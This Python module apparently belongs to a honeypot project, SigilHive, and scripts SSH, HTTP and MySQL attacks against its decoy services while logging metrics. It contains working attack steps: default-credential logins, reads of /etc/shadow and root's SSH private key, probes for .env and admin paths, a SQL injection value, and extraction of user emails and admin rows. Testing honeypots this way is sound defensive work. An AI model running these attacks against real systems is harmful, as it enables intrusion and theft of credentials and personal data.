"""
Real Attack Implementations for SigilHive
Executes actual SSH, HTTP, and Database attacks against honeypot services.
"""

import logging
import socket
import time
from dataclasses import dataclass
from enum import Enum
from typing import Any, Optional

import paramiko
import requests
from pymysql import connect as mysql_connect
from pymysql.err import MySQLError

logger = logging.getLogger(__name__)


@dataclass
class AttackMetric:
    """Single attack metric for Grafana."""
    timestamp: float
    protocol: str
    attack_type: str
    success: bool
    data_extracted: int  # bytes
    suspicion_level: float
    duration: float


class SSHAttacker:
    """Real SSH attack implementation."""

    def __init__(self, host: str, port: int, timeout: int = 5):
        self.host = host
        self.port = port
        self.timeout = timeout

    def attack_recon(self) -> tuple[bool, list[str], list[AttackMetric]]:
        """SSH reconnaissance - gather system info."""
        metrics = []
        responses = []
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            start = time.time()
            client.connect(
                self.host,
                port=self.port,
                username="test",
                password="test",
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
            )
            duration = time.time() - start
            
            commands = [
                "uname -a",
                "whoami",
                "id",
                "cat /etc/hostname",
            ]
            
            data_extracted = 0
            for cmd in commands:
                try:
                    _, stdout, _ = client.exec_command(cmd)
                    output = stdout.read().decode()
                    responses.append(output)
                    data_extracted += len(output)
                except Exception as e:
                    logger.debug(f"Command {cmd} failed: {e}")
            
            client.close()
            
            metric = AttackMetric(
                timestamp=time.time(),
                protocol="ssh",
                attack_type="recon",
                success=True,
                data_extracted=data_extracted,
                suspicion_level=0.15,
                duration=duration,
            )
            metrics.append(metric)
            return True, responses, metrics
            
        except Exception as e:
            logger.debug(f"SSH recon failed: {e}")
            metric = AttackMetric(
                timestamp=time.time(),
                protocol="ssh",
                attack_type="recon",
                success=False,
                data_extracted=0,
                suspicion_level=0.05,
                duration=time.time() - start,
            )
            metrics.append(metric)
            return False, [], metrics

    def attack_exploit(self) -> tuple[bool, list[str], list[AttackMetric]]:
        """SSH exploitation - attempt privilege escalation."""
        metric_start = time.time()
        metrics = []
        responses = []
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            start = time.time()
            client.connect(
                self.host,
                port=self.port,
                username="root",
                password="password",
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
            )
            duration = time.time() - start
            
            # Try to read sensitive files
            commands = [
                "cat /etc/shadow",
                "cat /root/.ssh/id_rsa",
                "sudo -l",
            ]
            
            data_extracted = 0
            success = False
            
            for cmd in commands:
                try:
                    _, stdout, stderr = client.exec_command(cmd)
                    output = stdout.read().decode() + stderr.read().decode()
                    if output and "Permission denied" not in output:
                        responses.append(output)
                        data_extracted += len(output)
                        success = True
                except Exception as e:
                    logger.debug(f"Exploit command {cmd} failed: {e}")
            
            client.close()
            
            metric = AttackMetric(
                timestamp=time.time(),
                protocol="ssh",
                attack_type="exploit",
                success=success,
                data_extracted=data_extracted,
                suspicion_level=0.35 if success else 0.20,
                duration=duration,
            )
            metrics.append(metric)
            return success, responses, metrics
            
        except Exception as e:
            logger.debug(f"SSH exploit failed: {e}")
            metric = AttackMetric(
                timestamp=time.time(),
                protocol="ssh",
                attack_type="exploit",
                success=False,
                data_extracted=0,
                suspicion_level=0.15,
                duration=time.time() - metric_start,
            )
            metrics.append(metric)
            return False, [], metrics


class HTTPAttacker:
    """Real HTTP attack implementation."""

    def __init__(self, host: str, port: int, timeout: int = 5):
        self.host = host
        self.port = port
        self.base_url = f"http://{host}:{port}"
        self.timeout = timeout

    def attack_recon(self) -> tuple[bool, list[str], list[AttackMetric]]:
        """HTTP reconnaissance - enumerate endpoints."""
        metrics = []
        responses = []
        
        try:
            start = time.time()
            
            endpoints = [
                "/robots.txt",
                "/.env",
                "/admin",
                "/api/v1/users",
                "/health",
                "/status",
            ]
            
            data_extracted = 0
            success = False
            
            for endpoint in endpoints:
                try:
                    resp = requests.get(
                        f"{self.base_url}{endpoint}",
                        timeout=self.timeout,
                    )
                    if resp.status_code != 404:
                        responses.append(f"{endpoint}: {resp.status_code}")
                        data_extracted += len(resp.text)
                        success = True
                except Exception as e:
                    logger.debug(f"HTTP GET {endpoint} failed: {e}")
            
            duration = time.time() - start
            
            metric = AttackMetric(
                timestamp=time.time(),
                protocol="http",
                attack_type="recon",
                success=success,
                data_extracted=data_extracted,
                suspicion_level=0.08,
                duration=duration,
            )
            metrics.append(metric)
            return success, responses, metrics
            
        except Exception as e:
            logger.debug(f"HTTP recon failed: {e}")
            metric = AttackMetric(
                timestamp=time.time(),
                protocol="http",
                attack_type="recon",
                success=False,
                data_extracted=0,
                suspicion_level=0.03,
                duration=time.time() - start,
            )
            metrics.append(metric)
            return False, [], metrics

    def attack_exploit(self) -> tuple[bool, list[str], list[AttackMetric]]:
        """HTTP exploitation - attempt SQL injection/authentication bypass."""
        metric_start = time.time()
        metrics = []
        responses = []
        
        try:
            start = time.time()
            
            exploits = [
                {
                    "url": f"{self.base_url}/api/v1/users",
                    "params": {"id": "1 OR 1=1"},
                },
                {
                    "url": f"{self.base_url}/login",
                    "data": {"username": "admin", "password": "admin"},
                },
                {
                    "url": f"{self.base_url}/admin",
                    "headers": {"Authorization": "Bearer invalid_token"},
                },
            ]
            
            data_extracted = 0
            success = False
            
            for exploit in exploits:
                try:
                    if "params" in exploit:
                        resp = requests.get(exploit["url"], params=exploit["params"], timeout=self.timeout)
                    elif "data" in exploit:
                        resp = requests.post(exploit["url"], data=exploit["data"], timeout=self.timeout)
                    else:
                        resp = requests.get(exploit["url"], headers=exploit.get("headers", {}), timeout=self.timeout)
                    
                    if resp.status_code == 200:
                        responses.append(f"Success: {exploit['url']}")
                        data_extracted += len(resp.text)
                        success = True
                    elif resp.status_code != 404:
                        responses.append(f"Interesting: {exploit['url']} ({resp.status_code})")
                        data_extracted += len(resp.text)
                except Exception as e:
                    logger.debug(f"HTTP exploit failed: {e}")
            
            duration = time.time() - start
            
            metric = AttackMetric(
                timestamp=time.time(),
                protocol="http",
                attack_type="exploit",
                success=success,
                data_extracted=data_extracted,
                suspicion_level=0.25 if success else 0.12,
                duration=duration,
            )
            metrics.append(metric)
            return success, responses, metrics
            
        except Exception as e:
            logger.debug(f"HTTP exploit failed: {e}")
            metric = AttackMetric(
                timestamp=time.time(),
                protocol="http",
                attack_type="exploit",
                success=False,
                data_extracted=0,
                suspicion_level=0.10,
                duration=time.time() - metric_start,
            )
            metrics.append(metric)
            return False, [], metrics


class DatabaseAttacker:
    """Real Database attack implementation."""

    def __init__(self, host: str, port: int, user: str = "root", password: str = ""):
        self.host = host
        self.port = port
        self.user = user
        self.password = password

    def attack_recon(self) -> tuple[bool, list[str], list[AttackMetric]]:
        """Database reconnaissance - enumerate databases/tables."""
        metric_start = time.time()
        metrics = []
        responses = []
        
        try:
            start = time.time()
            
            conn = mysql_connect(
                host=self.host,
                port=self.port,
                user=self.user,
                password=self.password,
                timeout=5,
            )
            
            cursor = conn.cursor()
            
            # Enumerate databases
            cursor.execute("SHOW DATABASES;")
            dbs = cursor.fetchall()
            responses.append(f"Databases: {dbs}")
            data_extracted = 256
            
            # Enumerate shophub tables
            if ("shophub",) in dbs:
                cursor.execute("SHOW TABLES FROM shophub;")
                tables = cursor.fetchall()
                responses.append(f"shophub tables: {tables}")
                data_extracted += 512
            
            cursor.close()
            conn.close()
            
            duration = time.time() - start
            
            metric = AttackMetric(
                timestamp=time.time(),
                protocol="database",
                attack_type="recon",
                success=True,
                data_extracted=data_extracted,
                suspicion_level=0.20,
                duration=duration,
            )
            metrics.append(metric)
            return True, responses, metrics
            
        except MySQLError as e:
            logger.debug(f"Database recon failed: {e}")
            metric = AttackMetric(
                timestamp=time.time(),
                protocol="database",
                attack_type="recon",
                success=False,
                data_extracted=0,
                suspicion_level=0.08,
                duration=time.time() - metric_start,
            )
            metrics.append(metric)
            return False, [], metrics

    def attack_exploit(self) -> tuple[bool, list[str], list[AttackMetric]]:
        """Database exploitation - attempt data extraction."""
        metric_start = time.time()
        metrics = []
        responses = []
        
        try:
            start = time.time()
            
            conn = mysql_connect(
                host=self.host,
                port=self.port,
                user=self.user,
                password=self.password,
                timeout=5,
            )
            
            cursor = conn.cursor()
            
            queries = [
                "SELECT COUNT(*) FROM shophub.users;",
                "SELECT email FROM shophub.users LIMIT 5;",
                "SELECT * FROM shophub.admin_users;",
            ]
            
            data_extracted = 0
            success = False
            
            for query in queries:
                try:
                    cursor.execute(query)
                    results = cursor.fetchall()
                    if results:
                        responses.append(f"{query}: {len(results)} rows")
                        data_extracted += len(str(results))
                        success = True
                except Exception as e:
                    logger.debug(f"Query {query} failed: {e}")
            
            cursor.close()
            conn.close()
            
            duration = time.time() - start
            
            metric = AttackMetric(
                timestamp=time.time(),
                protocol="database",
                attack_type="exploit",
                success=success,
                data_extracted=data_extracted,
                suspicion_level=0.40 if success else 0.15,
                duration=duration,
            )
            metrics.append(metric)
            return success, responses, metrics
            
        except MySQLError as e:
            logger.debug(f"Database exploit failed: {e}")
            metric = AttackMetric(
                timestamp=time.time(),
                protocol="database",
                attack_type="exploit",
                success=False,
                data_extracted=0,
                suspicion_level=0.12,
                duration=time.time() - metric_start,
            )
            metrics.append(metric)
            return False, [], metrics
